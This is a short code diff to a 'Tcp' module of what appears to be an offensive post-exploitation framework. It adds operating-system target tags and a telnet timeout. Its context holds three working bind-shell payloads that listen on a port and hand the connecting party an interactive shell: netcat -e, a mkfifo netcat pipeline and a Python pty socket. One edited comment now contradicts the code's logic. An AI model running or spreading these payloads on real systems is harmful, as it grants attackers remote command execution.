@@ -26,16 +26,19 @@ class Tcp(Module):
             ShellCmd(
               "nc -l -p ${port} -e ${shell}",
               name = 'netcat',
+              target = Os.NIX,
               background = True
               ),
             ShellCmd(
               "rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|${shell} -i 2>&1|nc -l ${port} >/tmp/f; rm -rf /tmp/f",
               name = 'netcat_bsd',
+              target = Os.NIX,
               background = True
               ),
               ShellCmd(
                 """python -c 'import pty,os,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("", ${port}));s.listen(1);(rem, addr) = s.accept();os.dup2(rem.fileno(),0);os.dup2(rem.fileno(),1);os.dup2(rem.fileno(),2);pty.spawn("${shell}");s.close()';""",
                 name = 'python_pty',
+                target = Os.NIX,
                 background = True
               )
             ]
@@ -75,7 +78,7 @@ class Tcp(Module):
                 continue
 
             try:
-                telnetlib.Telnet(urlparsed.hostname, args['port']).interact()
+                telnetlib.Telnet(urlparsed.hostname, args['port'], timeout = 5).interact()
 
                 # If telnetlib does not rise an exception, we can assume that
                 # ended correctly and return from `run()`
@@ -89,7 +92,7 @@ class Tcp(Module):
                     )
                 )
 
-        # If autoconnect was expected but no Telnet() calls worked,
+        # If autoconnect was expected but Telnet() calls worked,
         # prints error message
         if not args.get('no_autoconnect'):
             log.warn(
